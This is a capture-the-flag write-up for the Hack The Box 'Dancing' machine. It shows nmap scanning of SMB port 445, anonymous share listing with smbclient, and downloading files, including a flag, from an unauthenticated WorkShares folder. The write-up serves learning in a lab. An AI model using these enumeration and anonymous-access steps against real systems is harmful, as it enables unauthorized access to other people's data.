# 🚀 Hack The Box - Dancing Write-up

### **Machine Information**
| Machine Name | Target IP | Difficulty | Focus Service | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Dancing** | `10.129.171.100`| Very Easy | Windows | **SOLVED** ✅ |

<img width="784" height="543" alt="Screenshot 2026-05-06 141028" src="https://github.com/user-attachments/assets/36e59e9b-5d84-464a-a2f2-af5fec17d618" />


---

## 📝 Exploitation Summary
This lab focuses on vulnerabilities within the **SMB (Server Message Block)** service configured without authentication (*Anonymous Access*). By enumerating the shared folders (*shares*), we can retrieve sensitive data unauthorizedly.

---

## 🛠️ Walkthrough / Resolution Steps

### 1. Network Connection (VPN Setup)
The first step is to connect the local machine to the Hack The Box lab using OpenVPN.

```bash
# Navigate to the VPN file directory
cd Downloads

# Check file availability
ls

# Running the VPN
sudo openvpn starting_points_us-starting-point-1-dhcp(1).ovpn
```

<img width="994" height="190" alt="Screenshot 2026-05-06 134034" src="https://github.com/user-attachments/assets/e6f386e3-a602-49cd-acfd-e0029c8d0a91" />
<img width="1654" height="273" alt="Screenshot 2026-05-06 134108" src="https://github.com/user-attachments/assets/d6449b7e-a22a-4d9f-b304-ccbcefd83981" />

### 2. Connectivity Test
Ensuring the target is reachable from the Kali Linux machine.

```bash
ping -c 4 10.129.171.100
Result: 0% packet loss (Target active)
```

<img width="630" height="212" alt="Screenshot 2026-05-06 134220" src="https://github.com/user-attachments/assets/2622685a-b4b7-4ee6-b4c1-eb86b1dc8d2d" />


### 3. Port Scanning (Nmap Scanning)
Identifying open services on the target.

```bash
nmap -p445 -Pn -sC -T4 10.129.171.100
Result: Port 445/tcp is open running the microsoft-ds (SMB) service using the SMB2 protocol.
```

<img width="622" height="336" alt="Screenshot 2026-05-06 134529" src="https://github.com/user-attachments/assets/08b1ee38-9252-4947-ab79-3e1f8167c500" />


### 4. SMB Enumeration (SMB Listing)
Searching for available shared folders (shares) anonymously.

```bash
smbclient -L //10.129.171.100
Findings: Identified shares ADMIN$, C$, IPC$, and WorkShares.
```

<img width="862" height="232" alt="Screenshot 2026-05-06 135811" src="https://github.com/user-attachments/assets/7532744e-8024-4fb3-b831-d39498f98d38" />

### 5. Exploitation & File Access
Attempting to access the target folder without a password.

```bash
# Accessing the WorkShares folder
smbclient //10.129.171.100/WorkShares
```
<img width="649" height="436" alt="Screenshot 2026-05-06 140806" src="https://github.com/user-attachments/assets/58b8e003-47ba-462d-b0de-db4643de83f8" />

# Navigating inside the SMB Console:
```bash
dir - List folder contents.

cd Amy.J - Navigate into the Amy folder.

get worknotes.txt - Download the work notes.

cd .. - Return to the previous directory.

cd James.P - Navigate into the James folder.

get flag.txt - Download the flag file.
```

<img width="949" height="143" alt="Screenshot 2026-05-06 140833" src="https://github.com/user-attachments/assets/df53c474-83b6-4cc8-93ad-573bcddda32c" />
<img width="990" height="166" alt="Screenshot 2026-05-06 140843" src="https://github.com/user-attachments/assets/6d456189-e727-4052-b049-3ac407420f09" />
<img width="1006" height="225" alt="Screenshot 2026-05-06 141058" src="https://github.com/user-attachments/assets/b39f08cc-f353-41a6-83f8-e520699e2bbb" />


---
**Documented by**: Pagar Kristian Panjaitan
